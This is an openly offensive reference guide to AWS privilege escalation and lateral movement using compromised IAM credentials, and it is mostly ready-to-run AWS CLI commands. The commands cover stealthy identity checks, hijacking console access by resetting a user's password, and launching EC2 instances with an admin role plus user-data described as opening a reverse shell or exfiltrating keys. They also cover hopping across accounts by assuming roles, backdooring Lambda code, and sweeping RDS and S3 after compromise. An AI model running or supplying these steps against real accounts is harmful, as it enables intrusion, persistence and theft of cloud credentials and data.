# AWS Privilege Escalation & Lateral Movement

A reference guide for moving laterally through an AWS environment and escalating privileges using compromised IAM credentials.

#Installation Steps for AWS CLI 


## 1. Initial Access Validation
Before making noise, silently validate who you are and what you can do.
```bash
#Installing the CLI environment
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

#Enumeration of Services and Policies
aws iam list-roles --query 'Roles[*].RoleName' --output text | tr '\t' '\n' | while read role; do
    echo "Checking Role: $role"
    aws iam list-role-policies --role-name "$role" --query 'PolicyNames[*]' --output text | tr '\t' '\n' | while read policy; do
        aws iam get-role-policy --role-name "$role" --policy-name "$policy" | grep -Ei "(admin|full|*|iam:Put|iam:PassRole|sts:AssumeRole|ec2:RunInstances)"
    done
done

# Who am I? (Does not log to CloudTrail in most configurations)
aws sts get-caller-identity

# Enumerate attached policies
aws iam list-attached-user-policies --user-name <TARGET_USER>
aws iam list-user-policies --user-name <TARGET_USER>
2. Console Access Persistence
If you only have CLI keys, you can force Web Console access by updating the login profile, assuming you have iam:CreateLoginProfile or iam:UpdateLoginProfile permissions.

Bash
# Set a new console password for a compromised user account
aws iam update-login-profile \
  --user-name <TARGET_USER> \
  --password 'Pwn3dPassword123!' \
  --password-reset-required
3. High-Value Lateral Movement Vectors
A. The iam:PassRole Exploit (EC2)
If your compromised user has iam:PassRole and ec2:RunInstances, you can spawn a new EC2 machine, attach a highly privileged IAM Role (like an Administrator role) to it, and log into the instance to extract the temporary admin credentials via the metadata service (169.254.169.254).

Bash
# 1. Create a bash script (userdata.sh) that creates a reverse shell or exfiltrates keys.
# 2. Launch the instance and pass the target admin role to it.
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t2.micro \
  --iam-instance-profile Name="TargetAdminRole" \
  --user-data file://userdata.sh
B. STS AssumeRole Hopping
If your user has permissions to assume other roles, you can jump to higher privilege levels or cross into other AWS accounts (Cross-Account lateral movement).

Bash
# Assume the target role
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name JerichoHop
(Take the output AccessKeyId, SecretAccessKey, and SessionToken, and feed them into console_federator.py for immediate console access as that role).

C. Lambda Code Injection (lambda:UpdateFunctionCode)
If you can update Lambda functions, you can backdoor existing serverless architecture to extract environment variables or act as a persistence mechanism.

Bash
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://malicious_payload.zip

## 4. Service Enumeration (Post-Compromise)

### RDS Database Enumeration
Scan all regions for RDS instances to find databases containing sensitive data.

```bash
# List all RDS instances across all regions
for region in $(aws ec2 describe-regions --query "Regions[].RegionName" --output text); do
    echo "[+] Checking region: $region"
    aws rds describe-db-instances --region "$region" --query 'DBInstances[*].DBInstanceIdentifier' --output text 2>/dev/null
done
bash
# Detailed RDS enumeration (shows engine, public access, endpoints, security groups)
for region in $(aws ec2 describe-regions --query "Regions[].RegionName" --output text); do
    instances=$(aws rds describe-db-instances --region "$region" --query 'DBInstances[*].DBInstanceIdentifier' --output text 2>/dev/null)
    if [ -n "$instances" ] && [ "$instances" != "None" ]; then
        echo "=================================================="
        echo "[+] Region Found with RDS: $region"
        echo "=================================================="
        aws rds describe-db-instances --region "$region" \
            --query 'DBInstances[*].{Identifier:DBInstanceIdentifier,Engine:Engine,PubliclyAccessible:PubliclyAccessible,Endpoint:Endpoint.Address,SecurityGroups:VpcSecurityGroups[*].VpcSecurityGroupId}' \
            --output json
    fi
done
S3 Bucket Enumeration
Enumerate all S3 buckets and check for public access misconfigurations.

bash
# Check S3 buckets for public access block and policies
for bucket in $(aws s3api list-buckets --query "Buckets[].Name" --output text); do
    bpa=$(aws s3api get-public-access-block --bucket "$bucket" --output json 2>/dev/null || echo '{"PublicAccessBlockConfiguration": "Not Configured"}')
    policy=$(aws s3api get-bucket-policy --bucket "$bucket" --query 'Policy' --output text 2>/dev/null || echo "None")
    jq -n --arg b "$bucket" --argjson bp "$bpa" --arg pol "$policy" '{Bucket: $b, PublicAccessBlock: $bp, Policy: $pol}'
done
